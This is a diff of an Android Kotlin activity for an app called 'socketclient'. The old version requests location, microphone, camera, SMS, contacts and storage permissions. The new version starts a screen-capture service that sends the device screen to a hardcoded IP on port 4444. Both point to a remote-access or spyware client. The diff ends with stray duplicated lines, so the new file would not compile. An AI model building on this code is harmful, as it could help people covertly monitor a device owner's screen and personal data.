@@ -1,56 +1,33 @@
 package com.example.socketclient
 
-import android.Manifest
 import android.app.Activity
-import android.content.ComponentName
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.Bundle
-import android.provider.Settings
+import android.widget.Button
 import android.widget.Toast
-import androidx.activity.result.contract.ActivityResultContracts
+import androidx.activity.result.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
 
 class MainActivity : AppCompatActivity() {
 
-    private val REQUEST_PERMISSIONS_CODE = 1234
-
-    private val PERMISSIONS = arrayOf(
-        Manifest.permission.ACCESS_FINE_LOCATION,
-        Manifest.permission.RECORD_AUDIO,
-        Manifest.permission.CAMERA,
-        Manifest.permission.READ_SMS,
-        Manifest.permission.SEND_SMS,
-        Manifest.permission.READ_PHONE_STATE,
-        Manifest.permission.READ_EXTERNAL_STORAGE,
-        Manifest.permission.WRITE_EXTERNAL_STORAGE,
-        Manifest.permission.READ_CONTACTS
-    ).let { permissions ->
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions + Manifest.permission.POST_NOTIFICATIONS
-        } else {
-            permissions
-        }
+    // Constants for server IP and port
+    companion object {
+        const val SERVER_IP = "192.168.43.27" // Replace with your server IP
+        const val SERVER_PORT = 4444         // Replace with your server port
     }
-
-    private lateinit var mediaProjectionManager: MediaProjectionManager
-
-    // Your IP and Port
-    private val SERVER_IP = "192.168.43.27"
-    private val SERVER_PORT = 4444
 
     private val screenCaptureLauncher =
         registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
             if (result.resultCode == Activity.RESULT_OK && result.data != null) {
-                val serviceIntent = Intent(this, SocketService::class.java).apply {
-                    putExtra("mediaProjectionData", result.data)
-                    putExtra("server_ip", SERVER_IP)
-                    putExtra("server_port", SERVER_PORT)
+                val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
+                    putExtra("resultCode", result.resultCode)   // Important
+                    putExtra("data", result.data)               // Important (Intent is Parcelable)
+                    putExtra("server_ip", SERVER_IP)            // Server IP
+                    putExtra("server_port", SERVER_PORT)        // Server port
                 }
+
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     startForegroundService(serviceIntent)
                 } else {
@@ -60,6 +37,26 @@ class MainActivity : AppCompatActivity() {
             } else {
                 Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show()
             }
+        }
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+
+        // Button to start screen capture
+        val startButton: Button = findViewById(R.id.startButton)
+        startButton.setOnClickListener {
+            startScreenCapture()
+        }
+    }
+
+    private fun startScreenCapture() {
+        // Request the screen capture permission
+        val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
+        screenCaptureLauncher.launch(captureIntent)
+    }
+}
         }
 
     override fun onCreate(savedInstanceState: Bundle?) {
